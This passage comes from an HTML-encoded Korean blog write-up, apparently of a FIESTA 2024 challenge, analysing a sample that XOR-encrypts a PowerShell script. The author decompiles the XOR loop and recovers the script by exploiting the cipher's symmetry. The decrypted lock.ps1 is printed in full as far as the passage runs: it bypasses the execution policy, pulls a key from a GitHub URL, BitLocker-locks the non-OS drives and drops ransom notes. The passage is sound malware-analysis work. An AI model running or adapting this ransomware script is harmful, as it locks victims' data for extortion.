&lt;p&gt;어쨌든 루프 내부로 진입해 xor 당시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 가지고 key값과 xor 해준다는 사실을 알 수 있었다&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;이 없으면 실행 플로우의 문제로 판단하고 강제 종료하는 루틴이 있기 때문에 a로만 채운 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 넣어줬고&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 암호화로 뭐가 들어가고 그 결과로 뭐가 나오는지 알았다.&lt;/p&gt;

&lt;p&gt;그리고 암호화를 하기 위해 참조하는 데이터는 내부에 hard-coded되어있는 파일명임을 또한 알았다.&lt;/p&gt;

&lt;p&gt;마지막으로 암호화 루틴의 핵심은 XOR이며, XOR을 하기 전후에 딱히 데이터에 대한 비트 연산도 없다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;XOR을 통해 만들어진 암호문은 동일 루틴을 통과할 경우 입력값이었던 평문을 그대로 도출할 수 있다.&lt;/p&gt;

&lt;p&gt;블록 암호화를 위한 대칭키 알고리즘이 많지만, 복호화 알고리즘은 내가 아는 한 블록을 trimming해서 key와 매칭시키는 위상만 역으로 재현할 뿐이지 복호화 수식 자체는 암호화 수식과 동일하다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그리고 여기에서 봤을 때, XOR을 위해 block을 trimming 하는 부분에서는 key string에 1:1 매핑을 하기 위해 mod 연산으로 input block을 key string의 길이만큼씩 잘라 각 블록의 앞에서부터 순서대로 key와 XOR을 하는 것 이외의 위상 변화가 없다.&lt;/p&gt;

&lt;p&gt;즉, 해당 루틴의 I/O는 대칭이라고 결론지었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 내가 굳이 복호화를 위한 harness를 만들 필요가 없지 않을까?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;앞서 말한 대칭성 하에서 Input으로 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 넣어 Output으로 암호화된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_encrypted.ps1&lt;/code&gt;이 나왔다면&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Input으로 암호문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_encrypted.ps1&lt;/code&gt;을 넣었을 때 Output으로 복호화된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 도출할 테니까&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;그래서 암호문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_encrypted.ps1&lt;/code&gt;의 파일명을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;으로 바꾸고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enc.exe&lt;/code&gt;를 실행했다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;물론 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enc.exe&lt;/code&gt;를 끝까지 실행하면 vm에 BitLocker가 걸리기 때문에 ㅋㅋㅋㅋㅋ 그리고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 지우는 스크립트인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wiping.ps1&lt;/code&gt;이 실행될 것이므로…&lt;/p&gt;

&lt;p&gt;복호화만 완료시키고 강제종료 시켜줬다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2039.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lock.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ArgumentList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-NoProfile -ExecutionPolicy Bypass -Command &amp;amp; { &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$scriptBlock&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; }&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WindowStyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Scope&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LocalMachine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-RestMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-BitLockerVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-WmiObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Win32_OperatingSystem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SystemDrive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-String&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enable-BitLocker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EncryptionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Aes128&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PasswordProtector&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Disable-BitLockerAutoUnlock&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-BitLockerVolume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/ransomnote.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/imnothackerkkk/key/main/readme.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetFolderPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Desktop&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;note.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;readme.txt&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imageFileName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;note.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imagePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$desktopPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ChildPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$imageFileName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TypeDefinition&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;@&quot;
using System;
using System.Runtime.InteropServices;
public class Wallpaper
{
    [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
&quot;@&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPI_SETDESKWALLPAPER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
